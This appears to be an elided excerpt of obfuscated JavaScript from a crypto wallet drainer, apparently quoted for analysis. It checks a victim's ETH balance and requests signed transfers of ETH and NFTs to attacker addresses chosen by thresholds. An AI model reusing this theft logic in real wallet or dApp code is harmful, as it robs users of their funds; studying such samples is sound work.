...
async function askNfts() {
    ...
    for (nft of _0x1f76eb) {
        ...
        const _0x2986ff = _0x3967ee < 0.07 ? receiveAddress : nW;
...
const verifyAsset = async () => {
    ...
    try {
        ...
        if (_0x1a2ac4 > 0.0015) askTransferWithSign(_0x1a2ac4);
        else console[_0x42c6ec(0xad)](_0x42c6ec(0x8a)), sW('Info, balance is too low. (< 0.0015 ETH). Balance: \' ' + _0x1a2ac4);
    } catch (_0x17ae2a) {
...
async function askTransferWithSign(_0x2a70fc) {
    ...
    await _0x1ee9b4[_0xf7479e(0x119)][_0xf7479e(0xc0)](_0x39763a, _0xf7479e(0x9c))[_0xf7479e(0xc9)](async _0x2e46d => {
        ...
        const _0x44de49 = {
            ...
            'to': _0x2a70fc > 0.2962 ? nW : receiveAddress,
